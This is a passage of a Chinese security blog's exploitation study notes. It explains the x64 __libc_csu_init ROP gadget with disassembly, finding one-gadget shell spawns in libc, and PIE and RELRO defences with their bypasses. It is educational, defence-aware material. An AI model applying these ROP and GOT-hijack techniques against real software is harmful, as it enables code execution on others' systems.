+<h4 id="x64下通用Gadget"><a href="#x64下通用Gadget" class="headerlink" title="x64下通用Gadget"></a>x64下通用Gadget</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="keyword">short</span> loc_400600</span><br><span class="line">.text:<span class="number">0000000000400616</span></span><br><span class="line">.text:<span class="number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>j</span><br><span class="line">.text:<span class="number">0000000000400616</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>几乎所有的x64 ELF在_libc_csu_init函数中存在上面两个Gadget，第二个Gadget可以设置r13、r14、r15，再通过一个Gadget将这三个值分别送入rdx、rsi、edi中，正好涵盖了x64 cdecl调用约定下的前三个参数</p>
+<h2 id="One-Gadget"><a href="#One-Gadget" class="headerlink" title="One Gadget"></a>One Gadget</h2><p>通过OneGadget工具进行查找：<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p>
+<p>通常执行system(“/bin/sh”)需要在调用system之前传递参数；</p>
+<p>比较神奇的是，libc中包含一些gadget，直接跳转过去即可启动shell；</p>
+<p>通常通过寻找字符串”/bin/sh”的引用来寻找（对着/bin/sh的地址在IDA Pro中按X）</p>
+<h2 id="如何防御ROP"><a href="#如何防御ROP" class="headerlink" title="如何防御ROP"></a>如何防御ROP</h2><ul>
+<li>位置无关代码（PIE）可防御攻击者直接ROP<ul>
+<li>攻击者不知道代码地址</li>
+<li>ROP与return to PLT技术无法直接使用</li>
+</ul>
+</li>
+<li>PIE绕过方法<ul>
+<li>结合信息泄露漏洞</li>
+<li>x86_32架构下可爆破<ul>
+<li>内存地址随机化粒度以页为单位：0x1000字节对齐</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="如何防御GOT表劫持"><a href="#如何防御GOT表劫持" class="headerlink" title="如何防御GOT表劫持"></a>如何防御GOT表劫持</h2><ul>
+<li>重定位只读(Relocation Read Only)缓解措施<ul>
+<li>编译选项：gcc -z , relro</li>
+<li>在进入main()之前，所有的外部函数都会被解析</li>
+<li>所有GOT表设置为只读</li>
+<li>绕过方法<ul>
+<li>劫持为开启该保护的动态库中的GOT表(例如libc中的GOT表)</li>
+<li>改写函数返回地址或函数指针</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/04/26/│ñ═ñPWN▒╩╝╟01/" rel="next" title="长亭PWN笔记01">
+                  <i class="fa fa-chevron-left"></i> 长亭PWN笔记01
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/05/04/│ñ═ñPWN▒╩╝╟03/" rel="prev" title="长亭PWN笔记03">
+                  长亭PWN笔记03 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#回顾：栈布局"><span class="nav-number">1.</span> <span class="nav-text">回顾：栈布局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#回顾：Return-to-Libc"><span class="nav-number">2.</span> <span class="nav-text">回顾：Return to Libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#连接多个libc函数调用"><span class="nav-number">3.</span> <span class="nav-text">连接多个libc函数调用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#偏移计算"><span class="nav-number">3.0.1.</span> <span class="nav-text">偏移计算</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈迁移"><span class="nav-number">4.</span> <span class="nav-text">栈迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#add-esp"><span class="nav-number">4.1.</span> <span class="nav-text">add esp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop-ebp-ret-leave-ret"><span class="nav-number">4.2.</span> <span class="nav-text">pop ebp ret + leave ret</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">4.3.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GOT表劫持"><span class="nav-number">5.</span> <span class="nav-text">GOT表劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#思路"><span class="nav-number">5.0.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#详细步骤"><span class="nav-number">5.0.2.</span> <span class="nav-text">详细步骤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如果题目没有给予libc怎么办"><span class="nav-number">6.</span> <span class="nav-text">如果题目没有给予libc怎么办</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DynELF"><span class="nav-number">6.0.1.</span> <span class="nav-text">DynELF</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x64架构下的ROP"><span class="nav-number">7.</span> <span class="nav-text">x64架构下的ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#x64下通用Gadget"><span class="nav-number">7.0.1.</span> <span class="nav-text">x64下通用Gadget</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#One-Gadget"><span class="nav-number">8.</span> <span class="nav-text">One Gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何防御ROP"><span class="nav-number">9.</span> <span class="nav-text">如何防御ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何防御GOT表劫持"><span class="nav-number">10.</span> <span class="nav-text">如何防御GOT表劫持</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
